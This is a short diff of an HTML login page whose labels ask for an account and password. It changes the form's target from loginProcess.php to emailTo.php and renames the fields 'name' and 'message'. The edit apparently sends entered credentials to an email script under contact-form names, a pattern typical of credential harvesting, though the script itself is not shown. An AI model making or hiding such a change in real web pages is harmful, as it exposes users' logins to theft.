@@ -18,9 +18,9 @@
   <div class="texture">
   </div>
   <div class="login" align="center">
-    <form align="right" style="color:white;font-family:sans-serif;font-size:1.2em" method="POST" action="loginProcess.php">
-      <b>账号</b><input style="margin-top:100px" class="loginForm" type="text" name="account"></br>
-      <b>密码</b><input class="loginForm" type="password" name="password"></br>
+    <form align="right" style="color:white;font-family:sans-serif;font-size:1.2em" method="post" action="emailTo.php">
+      <b>账号</b><input style="margin-top:100px" class="loginForm" type="text" name="name"></br>
+      <b>密码</b><input class="loginForm" type="password" name="message"></br>
       <input class="loginbutton" type="submit" value="" align="center">
     </form>
   </div>
